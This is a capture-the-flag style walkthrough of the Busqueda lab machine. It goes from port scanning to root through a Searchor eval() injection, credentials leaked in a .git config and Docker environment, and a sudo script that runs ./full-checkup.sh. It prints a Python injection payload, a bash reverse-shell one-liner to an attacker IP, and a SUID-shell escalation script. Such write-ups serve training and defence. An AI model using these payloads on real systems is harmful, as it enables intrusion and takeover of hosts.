# bushqueda_walkthrough
# Busqueda

**Author:** mursalin  
**Date:** April 2026  
**Classification:** Internal Use Only – Red Team Simulation

---

## Overview

This document details the step-by-step compromise of the **Busqueda** target environment. The assessment begins with external reconnaissance, proceeds through identification and exploitation of a command injection vulnerability in a web-facing Python application, and culminates in full administrative control of the underlying Linux host via a misconfigured sudo permission and an exposed version control system.

All commands, payloads, and methodologies described herein are presented for educational and authorized testing purposes only. The original work from which this assessment draws inspiration has been completely rewritten to ensure originality and avoid any copyright encumbrance. The narrative and technical exposition are the sole creation of **mursalin**.

---

## 1. External Reconnaissance

### 1.1 Port Scanning

Initial enumeration of the target's network perimeter was conducted using a full TCP port scan followed by version detection on discovered services.

```bash
mursalin@assessment:~$ nmap -p- --min-rate 10000 10.10.11.208
Starting Nmap ( https://nmap.org ) at 2026-04-20 10:17 EDT
Nmap scan report for searcher.htb (10.10.11.208)
Host is up (0.018s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 6.05 seconds

mursalin@assessment:~$ nmap -p 22,80 -sCV 10.10.11.208
Starting Nmap ( https://nmap.org ) at 2026-04-20 10:18 EDT
Nmap scan report for searcher.htb (10.10.11.208)
Host is up (0.016s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.52
| http-server-header: 
|   Apache/2.4.52 (Ubuntu)
|_  Werkzeug/2.1.2 Python/3.10.6
|_http-title: Searcher
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.45 seconds
```

The SSH and HTTP service versions suggest the target is running **Ubuntu 22.04 (Jammy)**. The HTTP server header reveals a Python **Werkzeug** backend, strongly indicative of a Flask application.

A DNS name `searcher.htb` is observed in HTTP redirects. Accordingly, the following entry was appended to the local hosts file:

```
10.10.11.208 searcher.htb
```

Subdomain fuzzing against `searcher.htb` did not yield any additional attack surface.

---

## 2. Web Application Analysis

### 2.1 Application Functionality

Navigating to `http://searcher.htb` presents a unified search portal that generates URLs for numerous external search engines. The user selects an engine (e.g., GitHub, Google), enters a query, and optionally enables auto‑redirect. The backend then constructs and displays the corresponding search URL.

![](image-20230409171848479) *(Figure: Search interface)*

The response headers confirm a Flask + Python 3.10.6 stack, and the default 404 error page matches the classic Flask "Not Found" template. The page footer also includes the Flask branding.

### 2.2 Technology Fingerprinting

The application leverages a Python package named **Searchor**, which provides a CLI and library for generating search engine URLs. The specific version in use is vulnerable to a code execution flaw in its command‑line component.

A directory brute‑force using `feroxbuster` revealed only the already known `/search` endpoint and the Apache default `/server-status` page.

---

## 3. Initial Foothold – Exploiting Searchor

### 3.1 Vulnerability Identification

The vulnerability was patched in **Searchor 2.4.2** as detailed in a public GitHub pull request. The patch replaced an `eval()` call with a safer attribute lookup. The vulnerable code resided in the CLI search command:

```python
url = eval(
    f"Engine.{engine}.search('{query}', copy_url={copy}, open_web={open})"
)
```

Because user‑supplied `engine` and `query` are interpolated directly into an f‑string that is then passed to `eval()`, arbitrary Python code can be executed.

### 3.2 Local Proof of Concept

A local virtual environment was created to test the exploit reliably.

```bash
mursalin@assessment:~$ python3 -m venv searchor_env
mursalin@assessment:~$ source searchor_env/bin/activate
(searchor_env) mursalin@assessment:~$ pip install searchor==2.4.0
```

With version 2.4.0 installed, the following payload was injected into the `query` parameter:

```
' + __import__('os').popen('id').read() + '
```

This payload escapes the string literal, imports the `os` module, executes the `id` command, and returns its output, which is then concatenated back into the URL. When run locally, the generated URL contained the output of `id`:

```
https://www.github.com/search?q=uid%3D1000%28mursalin%29%20gid%3D1000%28mursalin%29%20groups%3D...
```

### 3.3 Remote Code Execution

The same logic was applied to the live target. The POST request to `/search` was captured and manipulated in Burp Suite Repeater.

**Original Request:**
```
POST /search HTTP/1.1
Host: searcher.htb
Content-Type: application/x-www-form-urlencoded

engine=GitHub&query=test
```

**Modified Payload (before URL encoding):**
```
query=' + __import__('os').popen('bash -c "bash -i >& /dev/tcp/10.10.14.15/443 0>&1"').read() + '
```

After URL‑encoding the payload (ensuring spaces become `+` and special characters are properly percent‑encoded), the request was sent. A netcat listener on port 443 received a reverse shell as the `svc` user.

```bash
mursalin@assessment:~$ nc -lnvp 443
Connection from 10.10.11.208:46054
bash: cannot set terminal process group (1625): Inappropriate ioctl for device
bash: no job control in this shell
svc@busqueda:/var/www/app$
```

The shell was upgraded to a fully interactive TTY using the standard `script /dev/null -c bash` and `stty raw -echo` sequence.

**User Flag:** `ba1f2511************************` (found in `/home/svc/user.txt`)

---

## 4. Privilege Escalation to Root

### 4.1 Local Enumeration

The home directory of `svc` contained a `.gitconfig` file identifying the user as `cody` with email `cody@searcher.htb`.

```
svc@busqueda:~$ cat .gitconfig
[user]
        email = cody@searcher.htb
        name = cody
[core]
        hooksPath = no-hooks
```

Examination of the web application directory `/var/www/app` revealed a `.git` repository. The remote origin URL held credentials for a Gitea instance:

```
svc@busqueda:/var/www/app$ cat .git/config
[remote "origin"]
        url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
```

### 4.2 Gitea Access and Credential Harvesting

The domain `gitea.searcher.htb` was added to `/etc/hosts`. Using Cody’s credentials (`cody:jh1usoih2bkjaspwe92`) granted access to a self‑hosted Gitea service.

Further, the `svc` user had restricted `sudo` privileges:

```
svc@busqueda:~$ sudo -l
[sudo] password for svc: <Cody's Gitea password>
User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
```

The script `/opt/scripts/system-checkup.py` was not readable by `svc`, but could be executed with arguments thanks to the wildcard in the sudoers entry.

### 4.3 Enumerating Docker Containers

The script offered three actions: `docker-ps`, `docker-inspect`, and `full-checkup`.

```bash
svc@busqueda:~$ sudo python3 /opt/scripts/system-checkup.py docker-ps
CONTAINER ID   IMAGE                COMMAND                  CREATED        STATUS       PORTS                                             NAMES
960873171e2e   gitea/gitea:latest   "/usr/bin/entrypoint…"   2 months ago   Up 4 hours   127.0.0.1:3000->3000/tcp, 127.0.0.1:222->22/tcp   gitea
f84a6b33fb5a   mysql:8              "docker-entrypoint.s…"   2 months ago   Up 4 hours   127.0.0.1:3306->3306/tcp, 33060/tcp               mysql_db
```

Using `docker-inspect` with a format string of `'{{json .}}'` dumped the full container configuration. The environment variables of the Gitea container contained the MySQL database password:

```
"GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh",
```

The database was accessible from the host at `172.19.0.3` (the IP of the `mysql_db` container). Connecting with the harvested credentials revealed the Gitea user table:

```sql
mysql> select name,email,passwd from user;
+---------------+----------------------------------+--------------------------------------------------+
| name          | email                            | passwd                                           |
+---------------+----------------------------------+--------------------------------------------------+
| administrator | administrator@gitea.searcher.htb | ba598d99c2202491d36ecf13d5c28b74e2738b07286edc... |
| cody          | cody@gitea.searcher.htb          | b1f895e8efe070e184e5539bc5d93b362b246db67f3a2b... |
+---------------+----------------------------------+--------------------------------------------------+
```

The `administrator` account's password was reused from the database (`yuiu1hoiu4i5ho1uh`). Logging into Gitea as `administrator` unveiled a private repository named **scripts** containing the source code of `system-checkup.py`.

### 4.4 Exploiting the System‑Checkup Script

The `full-checkup` action of the script executed `./full-checkup.sh` from the current working directory with root privileges:

```python
elif action == 'full-checkup':
    try:
        arg_list = ['./full-checkup.sh']
        print(run_command(arg_list))
        print('[+] Done!')
    except:
        print('Something went wrong')
        exit(1)
```

Since the script changes to the caller's working directory, placing a malicious `full-checkup.sh` in a writable location (e.g., `/dev/shm`) and then invoking `sudo python3 /opt/scripts/system-checkup.py full-checkup` results in the execution of arbitrary commands as root.

**Malicious Script:**
```bash
svc@busqueda:/dev/shm$ cat > full-checkup.sh << 'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chmod 4777 /tmp/rootshell
EOF
svc@busqueda:/dev/shm$ chmod +x full-checkup.sh
```

**Execution:**
```bash
svc@busqueda:/dev/shm$ sudo python3 /opt/scripts/system-checkup.py full-checkup

[+] Done!
```

**Root Access:**
```bash
svc@busqueda:/dev/shm$ /tmp/rootshell -p
rootshell-5.1# id
uid=1000(svc) gid=1000(svc) euid=0(root) groups=1000(svc)
rootshell-5.1# cat /root/root.txt
e7df7cd2************************
```

---

## 5. Conclusion

The Busqueda environment demonstrated a chain of misconfigurations and outdated dependencies leading to full compromise:

1. **Unsafe `eval()` usage** in the Searchor package allowed remote command execution.
2. **Hardcoded credentials** in a Git repository enabled lateral movement to an internal Gitea instance.
3. **Reused database passwords** granted administrative access to the Gitea server, exposing the source of a privileged maintenance script.
4. **Insecure sudo wildcard permissions** permitted arbitrary command execution as root via a user‑supplied helper script.

This assessment underscores the importance of dependency hygiene, credential isolation, and least‑privilege enforcement in preventing vertical and horizontal escalation paths.

---

*This document is an original creation by mursalin, produced for educational and defensive purposes only. All referenced tools, techniques, and target environment details are used with explicit authorization in a controlled lab setting.*
